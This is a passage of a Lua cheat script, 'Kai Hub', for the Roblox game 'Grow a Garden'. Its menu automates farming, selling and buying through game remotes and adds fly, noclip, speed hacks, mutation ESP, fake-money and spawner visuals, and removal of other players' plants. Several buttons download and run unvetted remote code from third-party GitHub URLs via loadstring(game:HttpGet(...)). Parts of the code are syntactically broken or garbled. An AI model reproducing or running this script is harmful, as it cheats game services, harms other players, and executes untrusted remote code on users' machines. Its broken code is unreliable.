        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                            if fruitModel:IsA("Model") then
                                createESP(fruitModel)
                            end
                        end
                    end
                end
            end
        end
    end
end

local function updateMutationCounts()
    local mutationCounts = {}
    for _, mutation in pairs(mutationOptions) do
        mutationCounts[mutation] = 0
    end
    local farms = {}
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    for _, farm in pairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in pairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in pairs(fruitsFolder:GetChildren()) do
                            if fruitModel:IsA("Model") then
                                local fruitId = fruitModel:GetFullName()
                                local mutationsFound = {}
                                for _, mutation in pairs(mutationOptions) do
                                    if fruitModel:GetAttribute(mutation) then
                                        mutationCounts[mutation] = mutationCounts[mutation] + 1
                                        table.insert(mutationsFound, mutation)
                                    end
                                end
                                if #mutationsFound > 0 and not notifiedFruits[fruitId] and state.espEnabled then
                                    notifiedFruits[fruitId] = true
                                    local plantName = plantModel.Name or "Unknown Plant"
                                    sendWebhookNotification(plantName, mutationsFound, lp.Name)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    local countText = ""
    for _, mutation in pairs(mutationOptions) do
        if mutationCounts[mutation] > 0 then
            countText = countText .. mutation .. ": " .. mutationCounts[mutation] .. ", "
        end
    end
    countText = countText:sub(1, -3)
    if countText == "" then countText = "No mutations found" end
    return countText
end

-- Table to track processed mutations (e.g., { [modelPath] = { mutation1 = true, mutation2 = true } })
local processedMutations = {}

-- Webhook Functions
local function sendWebhook(data)
    if not data or type(data) ~= "table" then return end
    local HttpService = game:GetService("HttpService")
    local json = HttpService:JSONEncode(data)
    local request = (syn and syn.request) or (http and http.request) or (http_request) or (request)
    if not request then return end
    local success, result = pcall(request, {
        Url = state.webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
    if not success then
        warn("Failed to send webhook: " .. tostring(result))
        return false
    end
    if result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300 then
        print("Webhook sent successfully!")
        return true
    else
        warn("Webhook failed with status " .. tostring(result.StatusCode) .. ": " .. tostring(result.Body))
        return false
    end
end

local function sendWebhookNotification(fruitName, mutation, farmName)
    if state.webhookUrl == "" then return end

    local webhookData = {
        content = "",
        embeds = {
            {
                title = "ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â· Mutation Detected! ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â·",
                description = string.format("A **%s** mutation was found!", mutation),
                color = 0x00FF00,
                fields = {
                    { name = "Fruit", value = fruitName or "Unknown", inline = true },
                    { name = "Farm", value = farmName or "Unknown", inline = true }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    return sendWebhook(webhookData)
end

-- Function to check farms and send notifications for new mutations
local function checkForMutations()
    if not workspace:FindFirstChild("Farm") or state.webhookUrl == "" or #state.selectedMutations == 0 then return end

    local farms = {}
    for _, farm in ipairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end

    for _, farm in ipairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do plantModel:IsA("Model")
                local fruitsFolder = plantModel:FindFirstChild("Fruits")
                if fruitsFolder then
                    for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do fruitModel:IsA("Model")
                        -- Create a unique identifier for this fruit model (e.g., full path)
                        local modelPath = fruitModel:GetFullName()

                        -- Initialize processed mutations for this model if not exists
                        if not processedMutations[modelPath] then
                            processedMutations[modelPath] = {}
                        end

                        -- Check for selected mutations
                        for _, mutation in ipairs(state.selectedMutations) do
                            if fruitModel:GetAttribute(mutation) == true then
                                -- Check if this mutation was already processed
                                if not processedMutations[modelPath][mutation] then
                                    -- Mark as processed
                                    processedMutations[modelPath][mutation] = true
                                    -- Send webhook notification for new mutation
                                    sendWebhookNotification(
                                        plantModel.Name,
                                        mutation,
                                        farm.Name
                                    )
                                    -- Optional: Add a short delay to avoid rate limits
                                    wait(0.5) -- Adjust based on Discord's rate limit (e.g., 30 req/min)
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    -- Optional: Clean up processed mutations for models that no longer exist
    for modelPath in pairs(processedMutations) do
        if not game:GetService("Workspace"):FindFirstChild(modelPath) then
            processedMutations[modelPath] = nil
        end
    end
end

-- UI Setup
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/takgoo170/Beta_Kai_Scripts/refs/heads/main/Beta.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local Window = Rayfield:CreateWindow({
    Title = "Kai Hub : Grow a Garden",
    SubTitle = "by Kai Team | (discord.gg/wDMPK3QAmY)",
    TabWidth = 149,
    Size = UDim2.fromOffset(540, 375),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})
    --[[ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "Polleser Hub" },
    Discord = { Enabled = true, Invite = "dmBzVaRrD3", RememberJoins = true },
    KeySystem = false,
    KeySettings = {
        Title = "Polleser Hub Key System",
        Subtitle = "Hello.",
        Note = "To get the Script's Key you need to join our Discord server the link is already copied.",
        FileName = "PolleserHub Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {
            "GaGBNfidudhdbKsksjd", "TesterKey000104", "PermKey001827367281", "PermKey161892947188", 
            "PermKey929474728199", "PermKey199293747291", "PermKey189193747381", "PermKey947493973892", 
            "PermKey183947749292", "PermKey648291927377", "PermKey179104847372", "PermKey632892938488", 
            "PermKey940402727289", "PermKey059472626183", "PermKey950492717183", "PermKey050472719199", 
            "PermKey500372628394", "PermKey040381618030", "PermKey508271728394", "PermKey192747483929", 
            "PermKey728199487473", "PermKey010284746371", "PermKey101082736282"
        }
    }
})]]

-- Tabs
local MainTab = Window:AddTab({ Title = "Main", Icon = "house" })
local ShopTab = Window:CreateTab({ Title = "Shop", Icon = "shopping-cart" })
local PlayerTab = Window:CreateTab({ Title = "Players", Icon = "user" })
local EventTab = Window:CreateTab({ Title = "Events", Icon = "flower" })
local MiscTab = Window:CreateTab({ Title = "Misc", Icon = "list" })
local SpawnerTab = Window:CreateTab({ Title = "Spawner", Icon = "paw-print" })
local VisualsTab = Window:CreateTab({ Title = "Visuals", Icon = "eye" })

-- Main Tab
MainTab:AddSection("Main Farm")
MainTab:AddToggle({ Title = "Auto Farm", Default = false, Callback = function(state) autoFarmEnabled = state if state then instantFarm() else if farmThread then task.cancel(farmThread) farmThread = nil end end end })
MainTab:AddToggle({ Title = "Auto Farm [ v2 ]", Description = "Make sure you look down! May not collect sometimes. Bad for packed areas!", Default = false, Callback = ToggleHarvest })
MainTab:AddToggle({ Title = "Auto Collect", Default = false, Callback = function(state) fastClickEnabled = state if state then fastClickFarm() else if fastClickThread then task.cancel(fastClickThread) fastClickThread = nil end end end })
MainTab:AddToggle({ Title = "Auto Collect [ v2 ]", Description = "Automatically collects fruits near you", Default = false, Callback = function(Value)
    spamE = Value
    updateFarmData()
    for _, farm in pairs(farms) do for _, obj in ipairs(farm:GetDescendants()) do if obj:IsA("ProximityPrompt") then handleNewPrompt(obj) end end end
    if spamE then
        collectionThread = task.spawn(function()
            while spamE and task.wait(0.1) do
                if not isInventoryFull() then
                    local char = lp.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        for prompt, _ in pairs(promptTracker) do
                            if prompt:IsA("ProximityPrompt") and prompt.Enabled and prompt.KeyboardKeyCode == Enum.KeyCode.E then
                                local targetPos
                                local parent = prompt.Parent
                                if parent:IsA("BasePart") then targetPos = parent.Position
                                elseif parent:IsA("Model") and parent:FindFirstChild("HumanoidRootPart") then targetPos = parent.HumanoidRootPart.Position end
                                if targetPos and (root.Position - targetPos).Magnitude <= RANGE then pcall(function() fireproximityprompt(prompt, 1, true) end) end
                            end
                        end
                    end
                end
            end
        end)
    else
        for prompt, data in pairs(promptTracker) do if prompt:IsA("ProximityPrompt") then pcall(function() prompt.RequiresLineOfSight = data.originalRequiresLOS prompt.Exclusivity = data.originalExclusivity end) end end
        if collectionThread then task.cancel(collectionThread) collectionThread = nil end
    end
end })
descendantConnection = workspace.DescendantAdded:Connect(function(obj) if obj:IsA("ProximityPrompt") and isInsideFarm(obj) then handleNewPrompt(obj) end end)
MainTab:AddToggle({ Title = "Auto Sell", Description = "Automatically sells when inventory is full (200)", Default = false, Callback = function(Value)
    autoSellEnabled = Value
    if autoSellEnabled then
        autoSellThread = task.spawn(function() while autoSellEnabled and task.wait(1) do if isInventoryFull() then sellItems() end end end)
    elseif autoSellThread then task.cancel(autoSellThread) end
end })
MainTab:AddSection("Exclude Mutations or Fruits")

local ignoredMutations = {"Celestial"} -- Table to store selected mutations to ignore
local ignoreMutationsEnabled = false -- Toggle for ignoring mutations
local allPromptsDisabled = false -- Toggle for disabling all prompts

-- Function to update ProximityPrompts for a single fruit
local function updateFruitPrompts(fruitModel)
    if not fruitModel:IsA("Model") then return end
    for _, obj in ipairs(fruitModel:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local shouldDisable = allPromptsDisabled
            if not allPromptsDisabled and ignoreMutationsEnabled then
                for _, mutation in ipairs(ignoredMutations) do
                    if fruitModel:GetAttribute(mutation) == true then
                        shouldDisable = true
                        break
                    end
                end
            end
            obj.Enabled = not shouldDisable
        end
    end
end

-- Function to update all ProximityPrompts in owned farms
local function updatePromptsForMutations()
    local farms = {}
    if not Workspace:FindFirstChild("Farm") then return end
    
    for _, farm in ipairs(Workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    
    for _, farm in ipairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                            updateFruitPrompts(fruitModel)
                        end
                    end
                end
            end
        end
    end
end

-- Monitor new fruits being added
local function setupFruitMonitoring()
    if not Workspace:FindFirstChild("Farm") then return end
    for _, farm in ipairs(Workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
            if plantsFolder then
                plantsFolder.ChildAdded:Connect(function(plantModel)
                    if plantModel:IsA("Model") then
                        local fruitsFolder = plantModel:WaitForChild("Fruits", 5)
                        if fruitsFolder then
                            fruitsFolder.ChildAdded:Connect(function(fruitModel)
                                updateFruitPrompts(fruitModel)
                            end)
                            -- Update existing fruits in the new plant
                            for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                                updateFruitPrompts(fruitModel)
                            end
                        end
                    end
                end)
            end
        end
    end
end

-- Initialize monitoring
setupFruitMonitoring()

-- Re-run monitoring setup when Farm or its children change
Workspace.Farm.ChildAdded:Connect(function()
    setupFruitMonitoring()
end)

-- Dropdown for selecting mutations to ignore
MainTab:AddDropdown({
    Title = "Exclude Mutations In Collecting",
    Values = mutationOptions, -- Assumes mutationOptions is defined
    Multi = true,
    Default = {},
    Callback = function(selectedOptions)
        ignoredMutations = selectedOptions
        updatePromptsForMutations()
    end
})

-- Toggle for ignoring selected mutations
MainTab:AddToggle({
    Title = "Ignore Selected Mutations",
    Default = false,
    Callback = function(state)
        ignoreMutationsEnabled = state
        updatePromptsForMutations()
    end
})

-- Toggle for ignoring all plants
MainTab:AddToggle({
    Title = "Ignore Every Plant (for mobile or pc idk)",
    Default = false,
    Callback = function(state)
        allPromptsDisabled = state
        updatePromptsForMutations()
    end
})
MainTab:AddSection("Sell")
MainTab:AddButton({ Title = "Insta Sell", Callback = SellAll })
MainTab:AddButton({ Title = "Insta Sell Hand", Callback = HSell })
MainTab:AddButton({
    Title = "Sell Pets",
    Description = "Sells all eligible pets in your backpack that are not favorited",
    Callback = function()
        local p = lp
        local b = p:WaitForChild("Backpack")
        local c = p.Character or p.CharacterAdded:Wait()
        local pets = {}
        for _, t in ipairs(b:GetChildren()) do
            if t:IsA("Tool") and t:FindFirstChild("PetToolLocal") and string.match(t.Name, "%[Age%s%d+%]") then
                if t:GetAttribute("Favorite") ~= true then
                    t.Parent = c
                    table.insert(pets, t)
                end
            end
        end
        c:PivotTo(CFrame.new(62, 3, 0))
        task.wait(0.3)
        local e = GameEvents:WaitForChild("SellPet_RE")
        for _, t in ipairs(pets) do 
            if t and t:IsDescendantOf(c) then 
                e:FireServer(t) 
            end 
        end
    end
})
MainTab:AddSection("Others")
MainTab:AddDropdown({ Title = "Select Mutations(Auto Fav)", Values = mutationOptions, Default = selectedMutations, Multi = true, Callback = function(Options) selectedMutations = Options if autoFavoriteEnabled then processBackpack() end end })
MainTab:AddToggle({ Title = "Auto-Favorite", CurrentValue = false, Callback = function(Value) autoFavoriteEnabled = Value if Value then setupAutoFavorite() elseif connection then connection:Disconnect() connection = nil end end })
MainTab:AddButton({ Title = "Unfav all", Callback = function() local backpack = lp:WaitForChild("Backpack") for _, tool in ipairs(backpack:GetChildren()) do local isFavorited = tool:GetAttribute("Favorite") or (tool:FindFirstChild("Favorite") and tool.Favorite.Value) if isFavorited then favoriteEvent:FireServer(tool) task.wait() end end end })
MainTab:AddToggle({ Title = "One Click Plant Remove", Description = "Be careful! Hope you don't delete something you needed!", Default = false, Callback = OneClickRemove })
MainTab:AddButton({ Title = "Stop Grow-ALL Pop-up", Callback = DestroySign = })

-- Shop Tab
ShopTab:AddSection("Auto Buy")
ShopTab:AddDropdown({
    Title = "Select Seeds",
    Description = "Choose which seeds to auto buy",
    Values = seedItems,
    Default = selectedSeeds,
    Multi = true,
    Callback = function(Options) selectedSeeds = Options end
})
ShopTab:AddDropdown({
    Title = "Select Gear",
    Description = "Choose which gear to auto buy",
    Values = gearItems,
    Default = selectedGears,
    Multi = true,
    Callback = function(Options) selectedGears = Options end
})
ShopTab:AddDropdown({
    Title = "Select Twilight",
    Description = "Choose which gear to auto buy",
    Values = TwilightItems,
    Default = selectedTwilight,
    Multi = true,
    Callback = function(Options) selectedTwilight = Options end
})
ShopTab:AddToggle({
    Title = "Auto Buy",
    Default = false,
    Callback = function(Value)
        autoBuyEnabled = Value
        if autoBuyEnabled then
            spawn(function()
                while autoBuyEnabled do
                    -- Auto buy selected seeds
                    for _, seed in ipairs(selectedSeeds) do
                        if autoBuyEnabled then
                            seedRemote:FireServer(seed)
                            wait(0.01) -- 0.1 second delay
                        end
                    end
                    -- Auto buy selected twilight
                    for _, twilight in ipairs(selectedTwilight) do
                        if autoBuyEnabled then
                            TwilightRemote:FireServer(twilight)
                            wait(0.01) -- 0.1 second delay
                        end
                    end
                    -- Auto buy selected gears
                    for _, gear in ipairs(selectedGears) do
                        if autoBuyEnabled then
                            gearRemote:FireServer(gear)
                            wait(0.01) -- 0.1 second delay
                        end
                    end
                end
            end)
        end
    end
})
ShopTab:AddToggle({
    Title = "Auto Buy Twilight",
    Default = false,
    Callback = function(Value)
        autoBuyEnabled = Value
        if autoBuyEnabled then
            spawn(function()
                while autoBuyEnabled do
                    -- Auto buy selected twilight
                    for _, twilight in ipairs(selectedTwilight) do
                        if autoBuyEnabled then
                            TwilightRemote:FireServer(twilight)
                            wait(0.01) -- 0.1 second delay
                        end
                    end
                end
            end)
        end
    end
})
ShopTab:AddToggle({ Name = "Auto Buy Eggs", Default = false, Callback = function(value) Autoegg_autoBuyEnabled = value if Autoegg_autoBuyEnabled then Autoegg_firstRun = true Autoegg_autoBuyEggs() end end })
ShopTab:AddSection("Cosmetic")
ShopTab:AddButton({ Title = "Open Cosmetic Shop", Callback = OpenCosmetic })
ShopTab:AddButton({ Title = "Buy Cosmetic Items x5 (In Stock it'll also drains your shuckles)",Callback = function()for _,s in ipairs({lp.PlayerGui.CosmeticShop_UI.CosmeticShop.Main.Holder.Shop.ContentFrame.TopSegment,lp.PlayerGui.CosmeticShop_UI.CosmeticShop.Main.Holder.Shop.ContentFrame.BottomSegment})do for _=1,5 do for _,f in ipairs(s:GetChildren())do if f:IsA("Frame")then GameEvents.BuyCosmeticItem:FireServer(f.Name)if f.Name:find("Crate")then GameEvents.BuyCosmeticCrate:FireServer(f.Name)end end end end end end})
local TeleportButton =
    ShopTab:AddButton(
    {
        Title = "Teleport to Cosmetic",
        Callback = function()
            local player = Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-287, 3, -15))
            else
                warn("Character or HumanoidRootPart not found.")
            end
        end
    }
)
ShopTab:AddSection("Events")
ShopTab:AddButton({ Title = "Open BloodShop", Callback = OpenBloodShop })
ShopTab:AddButton({ Title = "Open Twilight Shop", Callback = OpenTwilight })
ShopTab:AddButton({ Title = "Open Twilight Quest", Callback = OpenTwilightQuest })
ShopTab:AddSection("Menus")
ShopTab:AddButton({ Title = "Open Egg Shop 1", Description = "Click again to close", Callback = EggShop1 })
ShopTab:AddButton({ Title = "Open Egg Shop 2", Description = "Click again to close", Callback = EggShop2 })
ShopTab:AddButton({ Title = "Open Egg Shop 3", Description = "Click again to close", Callback = EggShop3 })
ShopTab:AddButton({ Title = "Open Seed Shop", Description = "Click again to close", Callback = OpenShop })
ShopTab:AddButton({ Title = "Open Gear Shop", Description = "Click again to close", Callback = OpenGearShop })
ShopTab:AddButton({ Title = "Open Quest", Description = "Click again to close", Callback = OpenQuest })

-- Player Tab
PlayerTab:AddSection("Movement")
PlayerTab:AddToggle({ Title = "Fly", Default = false, Callback = Fly })
PlayerTab:AddToggle({ Title = "No Clip", Default = false, Callback = ToggleNoclip })
PlayerTab:AddToggle({ Title = "Infinite Jump", Default = false, Callback = ToggleInfJump })
PlayerTab:AddSlider({ Title = "Walkspeed", Min = 0, Max = 350, Increment = 4, Suffix = "Speed", Default = 16, Callback = function(value) local char = lp.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").WalkSpeed = value end end })
PlayerTab:AddSlider({ Title = "Jump Height", Min = 0, Max = 300, Increment = 10, Suffix = "Height", Default = 50, Callback = function(value) local char = lp.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").JumpPower = value end end })

MiscTab:AddSection("Plants")
MiscTab:AddDropdown({ Title = "Select Seeds to Plant", Description = "Seeds to plant", Values = seedNames, Default = {}, Multi = true, Callback = function(opts) SelectedSeeds = opts end })
MiscTab:AddToggle({ Title = "Auto Plant", Description = "Fly and No Clip recommended to avoid glitches from growing crops", Default = false, Callback = function(state) AutoPlanting = state if state then startAutoPlanting() end end })
MiscTab:AddToggle({ Title = "Auto Submit Plant", Default = false, Callback = AutoGiveFruitMoon })
MiscTab:AddButton({
    Title = "Submit All Moon Fruits",
    Description = "Submits All Moon Fruits Of Yours.",
    Callback = function()
        local args = {
            "SubmitAllPlants"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("NightQuestRemoteEvent"):FireServer(unpack(args))
    end
})

MiscTab:AddSection("Extras")
MiscTab:AddButton({ Title = "AntiAfk (Press Once Only)", Callback = function() local success, error = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))() end) Rayfield:Notify({ Title = success and "Anti Afk" or "Error", Content = success and "Anti Afk script executed successfully!" or "Failed to execute Anti Afk script: " .. tostring(error), Duration = 5, Image = success and "rewind" or "alert-triangle" }) end })
MiscTab:AddButton({ Title = "ServerHop", Callback = function() local success, error = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Spectrum-Trash/Addons/refs/heads/main/FindServer.lua"))() end) Rayfield:Notify({ Title = success and "Server Finder" or "Error", Content = success and "Server Finder script executed successfully!" or "Failed to execute Server Finder script: " .. tostring(error), Duration = 5, Image = success and "rewind" or "alert-triangle" }) end })
MiscTab:AddButton({ Title = "ServerHop V2", Callback = ServerHop })
MiscTab:AddSection("Purchase Stuff (if it gave you the item dm me please)")
MiscTab:AddButton({ Title = "Buy Candy Blossom With Robux", Description = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, ProductId) end) end })
MiscTab:AddButton({ Title = "Buy Bug Egg", Description = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, 3277000452) end) end })
MiscTab:AddButton({ Title = "Buy Skip Expander Timer (1day)", Description = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, 3290577633) end) end })
MiscTab:AddButton({ Title = "Buy Skip Expander Timer (3days)", Description = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, 3290619407) end) end })

SpawnerTab:AddSection("Seed Spawner")
-- Seed Name Input
SpawnerTab:AddInput({
    Title = "Seed Name)",
    Default = "",
    Placeholder = "e.g, Beanstalk",
    Numeric = false,
    Finished = false, -- calls callback on each text change
    Callback = function(value)
        seedName = value
    end
})

-- Seed Quantity Input
SpawnerTab:AddInput({
    Title = "Quantity",
    Default = "0",
    Placeholder = "Amount",
    Numeric = true,
    Finished = false,
    Callback = function(value)
        seedAmount = tonumber(value) or 0
    end
})

-- Spawn Seeds Button
SpawnerTab:AddButton({
    Title = "Spawn Seeds",
    Callback = function()
        if seedName == "" or seedAmount <= 0 then return end
        
        local seedModels = game:GetService("ReplicatedStorage"):FindFirstChild("Seed_Models")
        local model = seedModels and seedModels:FindFirstChild(seedName)
        if not model then
            warn("No model found for seed name:", seedName)
            return
        end

        local tool = Instance.new("Tool")
        tool.Name = seedName .. " Seed [x" .. seedAmount .. "]"
        tool.RequiresHandle = true

        local cloneModel = model:Clone()
        local handle = cloneModel:IsA("Part") and cloneModel or cloneModel:FindFirstChildWhichIsA("Part")
        if not handle then
            warn("No handle part found in the seed model")
            return
        end

        handle.Name = "Handle"
        handle.Anchored = false
        handle.CanCollide = false
        handle.Massless = true
        handle.Parent = tool

        tool.Grip = CFrame.new(0.2, -0.449, 0.232) * CFrame.Angles(0, math.rad(0), 0)
        tool.Parent = game.Players.LocalPlayer.Backpack
    end
})

-- Pet Spawner Section
SpawnerTab:AddSection("Pet Spawner")

-- Pet Name Input
SpawnerTab:AddInput({
    Title = "Pet Name",
    Default = "",
    Placeholder = "e.g., Raccoon",
    Numeric = false,
    Finished = false,
    Callback = function(value)
        PetName = value
    end
})

-- Pet Weight Input
SpawnerTab:AddInput({
    Title = "Pet Weight",
    Default = "0",
    Placeholder = "e.g., 2",
    Numeric = true,
    Finished = false,
    Callback = function(value)
        PetWeight = tonumber(value) or 0
    end
})

-- Pet Age Input
SpawnerTab:AddInput({
    Title = "Pet Age",
    Default = "0",
    Placeholder = "e.g., 3",
    Numeric = true,
    Finished = false,
    Callback = function(value)
        PetAge = tonumber(value) or 0
    end
})
SpawnerTab:AddButton({
    Title = "Spawn Pet",
    Callback = function()
        local player = Players.LocalPlayer
        local backpack = player:WaitForChild("Backpack")
        local RS = game:GetService("ReplicatedStorage")
        local Models = RS:WaitForChild("Assets"):WaitForChild("Models"):WaitForChild("PetAssets")
        local Anims = RS:WaitForChild("Assets"):WaitForChild("Animations"):WaitForChild("PetAnimations")

        local petModel = Models:FindFirstChild(PetName)
        if not petModel then
            return warn("Pet not found: " .. PetName)
        end

        local pet = petModel:Clone()
        local root = pet:FindFirstChild("RootPart")
        if not root then
            return warn("No RootPart found in pet model")
        end

        root.Name = "Handle"
        pet.PrimaryPart = root

        local weight = tonumber(PetWeight) or 1
        pet:ScaleTo(1 + 0.05 * (weight / 0.5) + (weight - math.floor(weight)))

        local tool = Instance.new("Tool")
        tool.Name = ("%s\n[%s KG]\n[Age %s]"):format(PetName, PetWeight, PetAge)
        tool.RequiresHandle = true

        if PetName:lower() == "dragonfly" then
            tool.Grip = CFrame.new(0, -3, 0) * CFrame.Angles(math.rad(90), 0, 29.7)
        else
            tool.Grip = CFrame.Angles(math.rad(90), 0, math.rad(-90))
        end

        tool.Parent = backpack

        for _, part in ipairs(pet:GetChildren()) do
            part.Parent = tool
        end
        pet:Destroy()

        tool.Equipped:Connect(function()
            local animCtrl = tool:FindFirstChildWhichIsA("AnimationController", true)
                or Instance.new("AnimationController", tool)
            animCtrl.Name = PetName .. "Controller"

            local animator = animCtrl:FindFirstChildOfClass("Animator") or Instance.new("Animator", animCtrl)
            local animName = ({["fox"] = true, ["red fox"] = true})[PetName:lower()] and "Fox" or PetName
            local folder = Anims:FindFirstChild(animName)

            if folder and folder:FindFirstChild("Idle") then
                local anim = Instance.new("Animation", tool)
                anim.AnimationId = folder.Idle.AnimationId
                local track = animator:LoadAnimation(anim)
                track.Looped = true
                track:Play()
            else
                warn("No idle animation found for: " .. animName)
            end
        end)
    end
})
SpawnerTab:AddParagraph({
        Title = "THIS IS JUST A VISUAL!!!"
    })

-- Visuals Tab
VisualsTab:AddSection("ESP")
VisualsTab:CreateDropdown({ Title = "Select Mutations", Values = mutationOptions, Default = state.selectedMutations, Multi = true, Callback = function(options) state.selectedMutations = options updateESP() end })
VisualsTab:CreateToggle({ Title = "Enable Mutation ESP", Default = false, Callback = function(value) state.espEnabled = value updateESP() end })
local CountLabel = VisualsTab:AddParagraph({ Title = "Mutation Stats" })
RunService.Heartbeat:Connect(function() CountLabel:Set(updateMutationCounts()) end)
VisualsTab:AddSection("Mutation Webhook Notifier")

-- UI Setup
-- Discord Webhook URL Input using Fluent UI with Default-inspired styling

-- Assuming VisualsTab is your Fluent UI tab object

VisualsTab:AddInput({
    Title = "Discord Webhook URL",
    Description = "Enter your Discord webhook URL for mutation notifications",
    Placeholder = "https://discord.com/api/webhooks/...",
    Flag = "WebhookInput",
    Callback = function(value)
        state.webhookUrl = value
        if value ~= "" and #state.selectedMutations > 0 then
            checkForMutations() -- Trigger check when webhook is set
        end
    end
})

VisualsTab:AddDropdown({
    Title = "Select Mutations",
    Values = mutationOptions,
    Default = state.selectedMutations,
    Multi = true,
    Callback = function(options)
        state.selectedMutations = options
        if #options > 0 and state.webhookUrl ~= "" then
            checkForMutations() -- Trigger check when mutations are updated
        end
    end
})

-- Continuous checking loop
spawn(function()
    while true do
        if #state.selectedMutations > 0 and state.webhookUrl ~= "" then
            checkForMutations()
        end
        wait(5) -- Check every 5 seconds to avoid performance issues
    end
end)
VisualsTab:AddSection("Visuals")
VisualsTab:AddButton({ Title = "Remove Other's Plants", Description = "Removes everyone else's plants except yours", Callback = DestroyOthersFarm })
-- Assuming VisualsTab is your Fluent UI tab object

VisualsTab:AddInput({
    Title = "Fake Money",
    Placeholder = "Enter Amount",
    RemoveTextAfterFocusLost = false,
    Callback = function(value)
        local amount = tonumber(value)
        if not amount then return end
        
        -- Update player's Sheckles
        if lp and lp:FindFirstChild("leaderstats") and lp.leaderstats:FindFirstChild("Sheckles") then
            lp.leaderstats.Sheckles.Value = amount
        end

        -- Function to format numbers with commas
        local function formatCommas(n)
            local negative = n < 0
            n = tostring(math.abs(n))
            local left, num, right = string.match(n, "^([^%d]*%d)(%d*)(.-)$")
            local formatted = left .. (num:reverse():gsub("(%d%d%d)", "%1,"):reverse()) .. right
            return (negative and "-" or "") .. formatted .. "₵" -- Adjusted currency symbol
        end

        -- Function to shorten numbers
        local function shortenNumber(n)
            local scales = {
                {1000000000000000000, "Qi"},
                {999999986991104, "Qa"},
                {999999995904, "T"},
                {1000000000, "B"},
                {1000000, "M"},
                {1000, "K"}
            }
            local negative = n < 0
            n = math.abs(n)
            if n < 1000 then return (negative and "-" or "") .. tostring(math.floor(n)) end
            for i = 1, #scales do
                local scale, label = scales[i][1], scales[i][2]
                if n >= scale then
                    local value = n / scale
                    return (negative and "-" or "") .. (value % 1 == 0 and string.format("%.0f%s", value, label) or string.format("%.2f%s", value, label))
                end
            end
            return (negative and "-" or "") .. tostring(n)
        end

        -- Format the amounts for UI display
        local formattedDealer = formatCommas(amount)
        local formattedBoard = shortenNumber(amount)

        -- Update the Sheckles UI
        local shecklesUI = lp:FindFirstChild("PlayerGui") and lp.PlayerGui:FindFirstChild("Sheckles_UI")
        if shecklesUI and shecklesUI:FindFirstChild("TextLabel") then
            shecklesUI.TextLabel.Text = formattedDealer
        end

